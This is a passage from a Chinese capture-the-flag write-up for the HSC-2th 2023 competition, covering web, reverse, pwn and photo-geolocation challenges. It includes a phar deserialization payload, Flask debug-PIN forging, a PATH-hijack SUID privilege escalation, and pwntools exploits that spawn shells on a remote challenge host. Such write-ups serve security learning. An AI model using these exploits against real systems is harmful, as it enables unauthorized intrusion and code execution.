文件。</p><p>构造phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">View</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">View</span>();</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地运行生成 <code>phar.phar</code>，然后直接上传。文件上传成功之后，通过 <code>delete</code> 这个参数来触发 <code>file_exists()</code> 才可以利用phar，POST参数 <code>delete=phar://phar.phar</code> 即可拿到flag。</p><p>​    </p><h3 id="EZSYFLASK"><a href="#EZSYFLASK" class="headerlink" title="EZSYFLASK"></a>EZSYFLASK</h3><p>有一个可以文件包含的路由：<code>GET /view?filename=app.py</code>，得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;GET /view?filename=app.py&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">viewFile</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;cgroup&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;self&quot;</span> <span class="keyword">in</span> filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;WAF&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;文件存在&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;</span></span><br><span class="line"><span class="string">            &#123;&#125;</span></span><br><span class="line"><span class="string">            &lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;文件不存在&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;</span></span><br><span class="line"><span class="string">        文件不存在</span></span><br><span class="line"><span class="string">        &lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>去除参数可以触发debug报错页，计算PIN值可以进入调试模式。由于禁用了 <code>flag/self/cgroup</code>，<code>/proc/self/cgroup</code> 获取不到，可以利用 <code>/proc/1/mountinfo</code> 获取docker-id：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &gt;=3.8 sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&#x27;0242ac0208fe&#x27;</span>,<span class="number">16</span>)),<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/1/mountinfo</span></span><br><span class="line">    <span class="string">&#x27;7265fe765262551a676151a24c02b7b6&#x27;</span>+<span class="string">&#x27;bcf34bfb0be38980dddd4de1d57a8b7da2de7843ee55ed110016b97f5163406c&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>输入PIN码进入调试模式，在根目录下发现 <code>/flag</code> 和 <code>/readflag</code>，<code>/flag</code> 无权限读，而 <code>/readflag</code> 有SUID权限，需要提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo \&quot;/bin/bash\&quot;&gt;ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /</span><br><span class="line">./readflag</span><br></pre></td></tr></table></figure><p>输入 <code>print(os.popen(&quot;cd /tmp;echo \&quot;/bin/bash\&quot;&gt;ps;chmod 777 ps;echo $PATH;export PATH=/tmp:$PATH;cd /;./readflag&quot;).read())</code> 得flag。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="DECOMPILEONEOONE"><a href="#DECOMPILEONEOONE" class="headerlink" title="DECOMPILEONEOONE"></a>DECOMPILEONEOONE</h3><p>照代码逻辑还原即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x5C797E8971697066</span>,<span class="number">0x8D83497D7F6F7A3D</span>,<span class="number">0x949DA8758277A9A5</span>,<span class="number">0xB7954D7C</span>]</span><br><span class="line">cc = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">    <span class="keyword">if</span> (i&amp;<span class="number">1</span>)!=<span class="number">0</span>:</span><br><span class="line">        cc[i] = cc[i]+i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cc[i] = cc[i]+i</span><br><span class="line">    cc[i] ^= i + <span class="number">1</span></span><br><span class="line">    cc[i] -= <span class="number">3</span> * i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;reV3rSe_1s_sucH_hanD1e&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Whack-a-mole"><a href="#Whack-a-mole" class="headerlink" title="Whack-a-mole"></a>Whack-a-mole</h3><p>动调过反调试和中间的判断条件，使得流程走向正确的处理函数里，最后在 <code>Source</code> 字符串中查看到已修改得到的字符串：<code>w1n32_aP</code> 和 <code>i_iS_FUn</code>，连接得flag：<code>flag&#123;w1n32_aPi_iS_FUn&#125;</code>。</p><p>​    </p><h3 id="Base-secrets"><a href="#Base-secrets" class="headerlink" title="Base secrets"></a>Base secrets</h3><p>rust程序，比较难看，结合题目 <code>Base</code> 跟踪一下代码逻辑，发现编码后的字符串 <code>hexZh3tyVXM3X2AwX35yM+IxRU1nkz5nmWdzhXdF7Qo=</code>。</p><p>跟进到encode代码部分，提取出码表为 <code>456789+-IJKLMNOPQRSTUVWXghijklmnYZabcdefopqrstuvwxyz0123ABCDEFGH</code>，</p><p>base64解码得flag：<code>flag&#123;rUs7_n0_pr0b1EM_s0_yisey&#125;</code>。</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="EZPWN"><a href="#EZPWN" class="headerlink" title="EZPWN"></a>EZPWN</h3><p>简单ret2shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10059</span>)</span><br><span class="line"></span><br><span class="line">buf2=<span class="number">0x404080</span></span><br><span class="line">pl=asm(shellcraft.sh()).ljust(<span class="number">0x110</span>,<span class="string">&#x27;a&#x27;</span>)+p64(buf2)+p64(buf2)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Morris-II"><a href="#Morris-II" class="headerlink" title="Morris II"></a>Morris II</h3><p>在 <code>main() -&gt; fight_system() -&gt; confirm_input() -&gt; read()</code> 中发现明显的栈溢出漏洞，有backdoor，再ret2text即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10396</span>)</span><br><span class="line"></span><br><span class="line">dontlookatme=<span class="number">0x401236</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;from below：&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;hero\&#x27;s name!:\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(ret)+p64(dontlookatme)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EasyHeap"><a href="#EasyHeap" class="headerlink" title="EasyHeap"></a>EasyHeap</h3><p>类似<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">ctf-wiki的hacknote</a>，UAF菜单题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10575</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./Safe_Program&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">magic = <span class="number">0x80495BD</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">add(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>) <span class="comment"># show note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Safe-Program"><a href="#Safe-Program" class="headerlink" title="Safe Program"></a>Safe Program</h3><p>ret2libc，需要根据泄露地址查询libc为libc-2.31。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;43.143.254.94&#x27;</span>,<span class="number">10914</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./Safe_Program&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x401393</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x401391</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">puts_plt=elf.plt.puts</span><br><span class="line">puts_got=elf.got.puts</span><br><span class="line">main=<span class="number">0x401247</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;talk to me now:\n\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.send(pl)</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym.system</span><br><span class="line">binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;talk to me now:\n\n&#x27;</span>)</span><br><span class="line">pl=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system)+p64(main)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h2><h3 id="Happy-Lantern-Festival"><a href="#Happy-Lantern-Festival" class="headerlink" title="Happy Lantern Festival"></a>Happy Lantern Festival</h3><p>图片信息有阿勒泰市第十三届元宵灯会，搜索到举办地为五百里风情街，再在地图搜具体地址。</p><p><code>HSCSEC&#123;新疆维吾尔自治区阿勒泰地区阿勒泰市五百里风情街&#125;</code></p><p>​    </p><h3 id="Beautiful-Lake"><a href="#Beautiful-Lake" class="headerlink" title="Beautiful Lake"></a>Beautiful Lake</h3><p>放大图片发现宁夏理工学院，搜索宁夏理工学院附近的湖为星海湖，再在地图搜具体地址。</p><p><code>HSCSEC&#123;宁夏回族自治区石嘴山市大武口区星海湖&#125;</code></p><p>​    </p><h3 id="Apple-Store"><a href="#Apple-Store" class="headerlink" title="Apple Store"></a>Apple Store</h3><p>百度识图，搜到地点为apple官方(西单大悦城店)，再在地图搜具体地址。</p><p><code>HSCSEC&#123;北京市西城区西单北大街131号&#125;</code></p><p>​    </p><h3 id="Beautiful-Park"><a href="#Beautiful-Park" class="headerlink" title="Beautiful Park"></a>Beautiful Park</h3><p>百度识图，搜到新闻：<a href="https://www.sohu.com/a/540130745_121365332">华北最大的湿地公园位于碧桂园官厅蓝北侧 五一假期来这里玩水乘凉 看海棠花吧</a>，得到公园名，再在地图搜具体地址。</p><p><code>HSCSEC&#123;河北省张家口市怀来县官厅水库国家湿地公园&#125;</code></p><p>​    </p><h3 id="Boat"><a href="#Boat" class="headerlink" title="Boat"></a>Boat</h3><p>百度识图定位杭州西湖，再在地图搜具体地址。</p><p><code>HSCSEC&#123;浙江省杭州市西湖区龙井路1号&#125;</code></p><p>​    </p><h3 id="Airplane"><a href="#Airplane" class="headerlink" title="Airplane"></a>Airplane</h3><p>飞机图片里信息有B-30EL型号，搜索到新闻：<a href="https://baijiahao.baidu.com/s?id=1685764680862717493&amp;wfr=spider&amp;for=pc">又多了一个中型航空公司 重庆航空第30架飞机入列</a>，里面提到 <code>渝兴快线</code>，再根据地面机场特征，与地图比对，为北京大兴国际机场。</p><p><code>HSCSEC&#123;北京市大兴区大兴国际机场&#125;</code></p><p>​    </p><h3 id="Tower"><a href="#Tower" class="headerlink" title="Tower"></a>Tower</h3><p>百度识图为澳门埃菲尔铁塔，在地图搜具体地址，多次尝试才正确。</p><p><code>HSCSEC&#123;澳门特别行政区路氹填海区澳门路氹金光大道连贯公路澳门巴黎人&#125;</code></p><p>​    </p><h3 id="Cable-car"><a href="#Cable-car" class="headerlink" title="Cable car"></a>Cable car</h3><p>一眼重庆索道，根据索道和大桥的视角，在地图上找到大致范围，在利用地图3D模式，发现靠近江边的楼最高，只可能在这栋楼里，否则挡视线。楼里有标注着山什集，在美团上也能看到类似图片的分享，尝试该具体地址成功。</p><p><code>HSCSEC&#123;重庆市渝中区白象居4号楼9-1号&#125;</code></p><p>​    </p><h3 id="Romantic-firework"><a href="#Romantic-firework" class="headerlink" title="Romantic firework"></a>Romantic firework</h3><p>图片比较模糊，放大查看消防员衣服背后字样，猜测出甘肃消防，再搜索 <code>甘肃 焰火</code>，看到新闻：<a href="https://www.liuyangfc.com/news/18130.html">甘肃省白银市凌空造出两座”火焰山”，浏阳中洲烟花集团5.5万发高空礼花闪耀元宵夜</a>，新闻中有极其相似的照片；地点为白银城区金岭公园，再在地图搜具体地址。</p><p><code>HSCSEC&#123;甘肃省白银市白银区金岭公园&#125;</code></p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8&lt;/p&gt;
&lt;p&gt;本届HSC-2th 2023是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖we</summary>
      
    
    
    
